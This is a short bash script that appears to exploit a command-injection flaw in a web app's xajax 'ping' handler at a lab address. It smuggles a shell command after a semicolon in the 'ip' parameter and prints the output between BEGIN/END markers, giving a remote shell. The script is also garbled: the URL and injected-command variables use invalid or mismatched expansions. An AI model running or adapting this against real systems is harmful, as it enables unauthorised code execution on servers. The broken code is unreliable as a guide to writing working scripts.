#!/bin/bash

URL="${http://10.10.10.171}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${ls};echo \"END\"&xajaxargs[]=ping" "${http://10.10.10.171}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
